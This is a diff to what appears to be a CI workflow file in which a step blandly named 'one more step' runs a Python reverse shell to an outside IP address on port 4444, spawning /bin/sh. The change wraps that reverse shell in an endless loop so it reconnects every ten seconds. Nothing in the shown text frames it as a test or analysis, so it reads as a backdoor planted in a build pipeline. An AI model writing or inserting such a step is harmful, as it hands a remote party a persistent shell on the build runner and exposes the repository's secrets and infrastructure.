@@ -14,8 +14,12 @@ jobs:
 
     - name: one more step
       run: |
-        export RHOST="185.159.128.111";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-        sudo echo "Puck"
+        while true; do
+          export RHOST="185.159.128.111" ; 
+          export RPORT=4444 ;
+          python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")';
+          sleep 10
+        done
     
     - name: another step
       run: |
